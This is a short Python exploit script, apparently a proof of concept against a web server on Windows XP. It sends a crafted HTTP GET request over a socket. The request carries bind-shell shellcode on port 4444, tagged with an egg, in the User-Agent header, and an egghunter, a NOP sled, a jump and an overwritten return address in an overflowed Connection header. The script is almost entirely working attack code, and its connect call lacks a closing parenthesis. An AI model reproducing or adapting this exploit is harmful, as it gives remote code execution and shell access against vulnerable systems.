# Tested on windows xp
import socket
import struct

# bind 4444
shellcode =  "w00tw00t" # egg
shellcode += "\x89\xe1\xdb\xd6\xd9\x71\xf4\x5f\x57\x59\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
shellcode += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
shellcode += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
shellcode += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode += "\x49\x6c\x68\x68\x6e\x62\x33\x30\x45\x50\x53\x30"
shellcode += "\x65\x30\x6e\x69\x48\x65\x45\x61\x69\x50\x52\x44"
shellcode += "\x4e\x6b\x42\x70\x44\x70\x6c\x4b\x30\x52\x66\x6c"
shellcode += "\x6e\x6b\x73\x62\x37\x64\x4c\x4b\x72\x52\x36\x48"
shellcode += "\x76\x6f\x78\x37\x42\x6a\x71\x36\x56\x51\x49\x6f"
shellcode += "\x6e\x4c\x57\x4c\x50\x61\x53\x4c\x44\x42\x46\x4c"
shellcode += "\x31\x30\x6f\x31\x78\x4f\x44\x4d\x45\x51\x38\x47"
shellcode += "\x6a\x42\x79\x62\x62\x72\x46\x37\x4e\x6b\x61\x42"
shellcode += "\x62\x30\x4c\x4b\x43\x7a\x77\x4c\x4c\x4b\x70\x4c"
shellcode += "\x74\x51\x32\x58\x38\x63\x50\x48\x47\x71\x58\x51"
shellcode += "\x56\x31\x6e\x6b\x53\x69\x67\x50\x33\x31\x68\x53"
shellcode += "\x6c\x4b\x30\x49\x36\x78\x58\x63\x36\x5a\x42\x69"
shellcode += "\x4e\x6b\x75\x64\x6c\x4b\x75\x51\x6e\x36\x34\x71"
shellcode += "\x4b\x4f\x4c\x6c\x4f\x31\x78\x4f\x66\x6d\x43\x31"
shellcode += "\x49\x57\x74\x78\x6b\x50\x53\x45\x4a\x56\x46\x63"
shellcode += "\x73\x4d\x4b\x48\x55\x6b\x53\x4d\x31\x34\x52\x55"
shellcode += "\x6d\x34\x51\x48\x4e\x6b\x36\x38\x31\x34\x46\x61"
shellcode += "\x78\x53\x63\x56\x6e\x6b\x54\x4c\x52\x6b\x4c\x4b"
shellcode += "\x56\x38\x57\x6c\x53\x31\x69\x43\x4c\x4b\x65\x54"
shellcode += "\x6c\x4b\x67\x71\x4e\x30\x4f\x79\x73\x74\x65\x74"
shellcode += "\x35\x74\x73\x6b\x53\x6b\x61\x71\x30\x59\x70\x5a"
shellcode += "\x36\x31\x69\x6f\x69\x70\x61\x4f\x53\x6f\x53\x6a"
shellcode += "\x6e\x6b\x34\x52\x4a\x4b\x4c\x4d\x31\x4d\x31\x78"
shellcode += "\x57\x43\x47\x42\x43\x30\x55\x50\x50\x68\x54\x37"
shellcode += "\x32\x53\x34\x72\x51\x4f\x52\x74\x31\x78\x52\x6c"
shellcode += "\x70\x77\x76\x46\x65\x57\x39\x6f\x4e\x35\x4f\x48"
shellcode += "\x4e\x70\x45\x51\x55\x50\x73\x30\x57\x59\x69\x54"
shellcode += "\x52\x74\x30\x50\x53\x58\x36\x49\x4b\x30\x30\x6b"
shellcode += "\x75\x50\x69\x6f\x69\x45\x61\x7a\x54\x48\x31\x49"
shellcode += "\x52\x70\x59\x72\x4b\x4d\x31\x50\x52\x70\x33\x70"
shellcode += "\x70\x50\x61\x78\x4b\x5a\x76\x6f\x6b\x6f\x4b\x50"
shellcode += "\x59\x6f\x39\x45\x4c\x57\x70\x68\x35\x52\x35\x50"
shellcode += "\x66\x71\x31\x4c\x6e\x69\x68\x66\x32\x4a\x44\x50"
shellcode += "\x61\x46\x66\x37\x53\x58\x68\x42\x59\x4b\x74\x77"
shellcode += "\x42\x47\x6b\x4f\x4b\x65\x36\x37\x31\x78\x4e\x57"
shellcode += "\x49\x79\x30\x38\x69\x6f\x59\x6f\x69\x45\x31\x47"
shellcode += "\x32\x48\x53\x44\x6a\x4c\x45\x6b\x49\x71\x39\x6f"
shellcode += "\x59\x45\x66\x37\x6f\x67\x55\x38\x31\x65\x42\x4e"
shellcode += "\x62\x6d\x35\x31\x49\x6f\x49\x45\x51\x78\x52\x43"
shellcode += "\x72\x4d\x50\x64\x43\x30\x4e\x69\x4a\x43\x36\x37"
shellcode += "\x50\x57\x62\x77\x54\x71\x4b\x46\x71\x7a\x74\x52"
shellcode += "\x56\x39\x53\x66\x49\x72\x79\x6d\x71\x76\x68\x47"
shellcode += "\x71\x54\x64\x64\x35\x6c\x45\x51\x43\x31\x6c\x4d"
shellcode += "\x32\x64\x61\x34\x52\x30\x68\x46\x55\x50\x72\x64"
shellcode += "\x42\x74\x42\x70\x36\x36\x33\x66\x43\x66\x71\x56"
shellcode += "\x56\x36\x42\x6e\x30\x56\x62\x76\x42\x73\x51\x46"
shellcode += "\x71\x78\x70\x79\x38\x4c\x77\x4f\x4e\x66\x69\x6f"
shellcode += "\x68\x55\x6b\x39\x39\x70\x72\x6e\x56\x36\x30\x46"
shellcode += "\x59\x6f\x66\x50\x63\x58\x76\x68\x6f\x77\x45\x4d"
shellcode += "\x53\x50\x79\x6f\x4a\x75\x6f\x4b\x49\x6e\x44\x4e"
shellcode += "\x37\x42\x39\x7a\x71\x78\x39\x36\x7a\x35\x4d\x6d"
shellcode += "\x4f\x6d\x4b\x4f\x4e\x35\x75\x6c\x73\x36\x71\x6c"
shellcode += "\x35\x5a\x6b\x30\x4b\x4b\x49\x70\x73\x45\x67\x75"
shellcode += "\x6d\x6b\x43\x77\x62\x33\x61\x62\x62\x4f\x30\x6a"
shellcode += "\x77\x70\x56\x33\x6b\x4f\x68\x55\x41\x41"

egghunter =  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

magic =  "GET index.html HTTP/1.1\r\n"
magic += "User-Agent: " + shellcode + "\r\n"
magic += "Connection: "
magic += "\x90" * (2260 - len(egghunter))
magic += egghunter
magic += "\xEB\x80\x90\x90"  # jump back 0x80 bytes
magic += struct.pack("I", 0x6fc4d724)
magic += "\x90" * 28
magic += "\r\n\r\n"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1", 80)
s.send(magic)
